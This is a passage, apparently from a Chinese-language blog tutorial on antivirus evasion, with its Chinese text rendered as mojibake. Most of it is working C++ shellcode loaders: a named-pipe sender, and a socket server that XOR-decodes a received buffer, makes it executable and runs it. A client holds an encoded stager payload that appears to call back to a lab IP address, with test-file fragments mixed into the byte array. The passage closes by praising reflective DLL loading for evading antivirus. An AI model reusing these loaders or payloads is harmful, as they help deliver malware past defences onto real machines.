33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a&quot;</span>;</span><br><span class="line">PTCHAR ptsPipeName = TEXT(<span class="string">&quot;\.\pipe\BadCodeTest&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">RecvShellcode</span><span class="params">(VOID)</span></span>&#123;</span><br><span class="line">    HANDLE hPipeClient;</span><br><span class="line">    DWORD dwWritten;</span><br><span class="line">    DWORD dwShellcodeSize = <span class="keyword">sizeof</span>(buf);</span><br><span class="line">    <span class="comment">// ç­‰å¾…ç®¡é“å¯ç”¨</span></span><br><span class="line">    WaitNamedPipe(ptsPipeName,NMPWAIT_WAIT_FOREVER);</span><br><span class="line">    <span class="comment">// è¿æ¥ç®¡é“</span></span><br><span class="line">    hPipeClient = CreateFile(ptsPipeName,GENERIC_WRITE,FILE_SHARE_READ,<span class="literal">NULL</span>,OPEN_EXISTING ,FILE_ATTRIBUTE_NORMAL,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(hPipeClient == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Can&#x27;t Open Pipe , Error : %d \n&quot;</span>,GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WriteFile(hPipeClient,buf,dwShellcodeSize,&amp;dwWritten,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(dwWritten == dwShellcodeSize)&#123;</span><br><span class="line">        CloseHandle(hPipeClient);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Send Success ! Shellcode : %d Bytes\n&quot;</span>,dwShellcodeSize);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hPipeClient);</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    RecvShellcode();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ç½‘ç»œå¥—æ¥å­—ï¼ˆsocketï¼‰"><a href="#ç½‘ç»œå¥—æ¥å­—ï¼ˆsocketï¼‰" class="headerlink" title="ç½‘ç»œå¥—æ¥å­—ï¼ˆsocketï¼‰"></a>ç½‘ç»œå¥—æ¥å­—ï¼ˆsocketï¼‰</h2><p>é€šè¿‡å»ºç«‹ä¸€ä¸ªå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ï¼Œè¿›è¡ŒShellcodeçš„æ”¶å‘ï¼Œç±»ä¼¼äºJavaä¸­çš„ååºåˆ—åŒ–ã€‚</p><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/1a40f881fa1acfbe75f302bfff33a013.png"></p><p>Server:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">RunCode</span><span class="params">(CHAR * code,DWORD dwCodeLen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    DWORD dwOldProtect;</span><br><span class="line">    DWORD dwThreadId;</span><br><span class="line">    PCHAR pszShellcode = (PCHAR)VirtualAlloc(<span class="literal">NULL</span>,dwCodeLen,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">    CopyMemory(pszShellcode,code,dwCodeLen);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(DWORD i = <span class="number">0</span>;i&lt; dwCodeLen; i++)&#123;</span><br><span class="line">            _InterlockedXor8(pszShellcode+i,<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// è¿™é‡Œå¼€å§‹æ›´æ”¹å®ƒçš„å±æ€§ä¸ºå¯æ‰§è¡Œ</span></span><br><span class="line">        VirtualProtect(pszShellcode,dwCodeLen,PAGE_EXECUTE,&amp;dwOldProtect);</span><br><span class="line">        <span class="comment">// æ‰§è¡ŒShellcode</span></span><br><span class="line">        hThread = CreateThread(</span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// å®‰å…¨æè¿°ç¬¦</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// æ ˆçš„å¤§å°</span></span><br><span class="line">            (LPTHREAD_START_ROUTINE)pszShellcode, <span class="comment">// å‡½æ•°</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// å‚æ•°</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// çº¿ç¨‹æ ‡å¿—</span></span><br><span class="line">            &amp;dwThreadId <span class="comment">// çº¿ç¨‹ID</span></span><br><span class="line">        );</span><br><span class="line">        WaitForSingleObject(hThread,INFINITE);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR argv[])</span></span>&#123;</span><br><span class="line">    CHAR buf[<span class="number">801</span>];</span><br><span class="line">    DWORD dwError;</span><br><span class="line">    WORD sockVersion = MAKEWORD(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    SOCKET socks;</span><br><span class="line">    SOCKET sClient;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">s_client</span>;</span></span><br><span class="line">    INT nAddrLen = <span class="keyword">sizeof</span>(s_client);</span><br><span class="line">    SHORT sListenPort = <span class="number">8888</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (WSAStartup(sockVersion, &amp;wsaData) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]WSAStarup Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (socks == INVALID_SOCKET)</span><br><span class="line">    &#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]Socket Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line">    <span class="built_in">sin</span>.sin_port = htons(sListenPort);</span><br><span class="line">    <span class="built_in">sin</span>.sin_addr.S_un.S_addr = INADDR_ANY;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(bind(socks,(struct sockaddr *)&amp;<span class="built_in">sin</span>,<span class="keyword">sizeof</span>(<span class="built_in">sin</span>)) == SOCKET_ERROR )</span><br><span class="line">    &#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]Bind Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">listen</span>(socks, <span class="number">5</span>) == SOCKET_ERROR)</span><br><span class="line">    &#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]Listen  Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sClient = accept(socks, (SOCKADDR *)&amp;s_client, &amp;nAddrLen);</span><br><span class="line">    <span class="keyword">int</span> ret = recv(sClient,buf,<span class="keyword">sizeof</span>(buf),<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Recv %d-Bytes \n&quot;</span>,ret);</span><br><span class="line">        closesocket(sClient);</span><br><span class="line">        closesocket(socks);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WSACleanup();</span><br><span class="line">    RunCode(buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Client:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="keyword">char</span> buf[] = <span class="string">&quot;\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR argv[])</span></span>&#123;</span><br><span class="line">    DWORD dwError;</span><br><span class="line">    WORD sockVersion = MAKEWORD(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    SOCKET socks;</span><br><span class="line">    SHORT sListenPort = <span class="number">8888</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (WSAStartup(sockVersion, &amp;wsaData) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]WSAStarup Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (socks == INVALID_SOCKET)</span><br><span class="line">    &#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]Socket Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line">    <span class="built_in">sin</span>.sin_port = htons(sListenPort);</span><br><span class="line">    <span class="built_in">sin</span>.sin_addr.S_un.S_addr = inet_addr(<span class="string">&quot;192.168.170.1&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">connect</span>(socks,(struct sockaddr *)&amp;<span class="built_in">sin</span>,<span class="keyword">sizeof</span>(<span class="built_in">sin</span>)) == SOCKET_ERROR )</span><br><span class="line">    &#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]Bind Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ret = send(socks,buf,<span class="keyword">sizeof</span>(buf),<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ret &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Send %d-Bytes \n&quot;</span>,ret);</span><br><span class="line">        closesocket(socks);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WSACleanup();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ç¬¬å…­è¯¾"><a href="#ç¬¬å…­è¯¾" class="headerlink" title="ç¬¬å…­è¯¾"></a>ç¬¬å…­è¯¾</h1><h2 id="MemoryMoudle"><a href="#MemoryMoudle" class="headerlink" title="MemoryMoudle"></a>MemoryMoudle</h2><p>é¡¹ç›®èƒŒæ™¯ï¼šWindowsæ“ä½œç³»ç»Ÿåœ¨æ‰§è¡Œä¸€ä¸ªWindows PEæ ¼å¼çš„æ–‡ä»¶æ—¶ï¼ŒWindowsè‡ªèº«æ˜¯æœ‰ä¸€ä¸ªWindows PEæ ¼å¼çš„è§£æå™¨ï¼Œé€šè¿‡PEæ ¼å¼æŠŠæ–‡ä»¶çš„å„ä¸ªèŠ‚æ”¾å…¥ä¸åŒçš„å†…å­˜åŒºåŸŸã€‚</p><p>çˆ±æŠ˜è…¾çš„ç¨‹åºå‘˜è‡ªå·±ä¹Ÿæƒ³å®ç°è¿™ä¸ªè¿‡ç¨‹ï¼Œé‚£å°±æ˜¯åå°„ï¼Œè¿™ä¸ªåå°„æœºåˆ¶å°±æ˜¯å°†Windows PEæ ¼å¼é€šè¿‡è‡ªå·±å†™çš„ä»£ç è¿›è¡Œè§£æï¼Œå¹¶æŠŠä¸åŒçš„èŠ‚æ•°æ®åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œé€šå¸¸è¿™ä¸ªåå°„åŠ è½½æŠ€æœ¯è¢«å¾ˆå¤šAPTç»„ç»‡ã€å¤§å‹æ¸—é€æ¡†æ¶ã€ç—…æ¯’ä½œè€…ä½¿ç”¨æ¯”è¾ƒå¹¿æ³›ã€‚</p><p>å½“ä¸€ä¸ªWindows PEæ ¼å¼çš„æ–‡ä»¶å˜æˆäº†ä¸€ä¸ªå†…å­˜ä¸­çš„å­—ç¬¦ä¸²ï¼Œæ„å‘³ç€è¿™ä¸ªæ–‡ä»¶å¯ä»¥è¢«ä»»æ„æ–¹å¼å»è½¬æ¢ã€åŠ å¯†ã€æ··æ·†ï¼Œå› æ­¤åç—…æ¯’è½¯ä»¶ä¹Ÿéš¾ä»¥æŸ¥æ€ã€‚</p><p>MemoryModuleå°±æ˜¯å®ç°äº†è¿™ä¸ªè¿‡ç¨‹ï¼š<a href="https://github.com/fancycode/MemoryModule">https://github.com/fancycode/MemoryModule</a></p><p>ä½†æ˜¯èµ„æ–™éƒ½æ˜¯è‹±æ–‡çš„ï¼Œæˆ‘åœ¨å›½å†…çš„ç¤¾åŒºä¸Šæ‰¾åˆ°äº†ä¸­æ–‡ç‰ˆæœ¬çš„ï¼š<a href="https://gitee.com/china_jeffery/MemoryModule">https://gitee.com/china_jeffery/MemoryModule</a></p><p>å°±æ˜¯ä»å†…å­˜ä¸­åŠ è½½DLLï¼Œå…·ä½“å®ç°åŸç†ï¼š</p><p><a href="https://payloads.online/archivers/2019-03-14/1">https://payloads.online/archivers/2019-03-14/1</a></p><h2 id="åå°„DLLåŠ è½½çš„å®éªŒ"><a href="#åå°„DLLåŠ è½½çš„å®éªŒ" class="headerlink" title="åå°„DLLåŠ è½½çš„å®éªŒ"></a>åå°„DLLåŠ è½½çš„å®éªŒ</h2><p>é¦–å…ˆä½“éªŒä¸€ä¸‹æ­£å¸¸DLLåŠ è½½çš„è¿‡ç¨‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">msg</span><span class="params">(VOID)</span></span>&#123;</span><br><span class="line">MessageBox(<span class="literal">NULL</span>,TEXT(<span class="string">&quot;Test&quot;</span>),TEXT(<span class="string">&quot;Hello&quot;</span>),MB_OK);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">VOID</span> <span class="params">(*msg)</span><span class="params">(VOID)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">msg RunMsg;</span><br><span class="line">HMODULE  hBadCode = LoadLibrary(TEXT(<span class="string">&quot;BadCode-DLL.dll&quot;</span>));</span><br><span class="line"></span><br><span class="line">RunMsg = (msg)GetProcAddress(hBadCode,<span class="string">&quot;msg&quot;</span>);</span><br><span class="line">RunMsg();</span><br><span class="line">FreeLibrary(hBadCode);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡LoadLibraryè¿™ä¸ªAPIæ¥åŠ 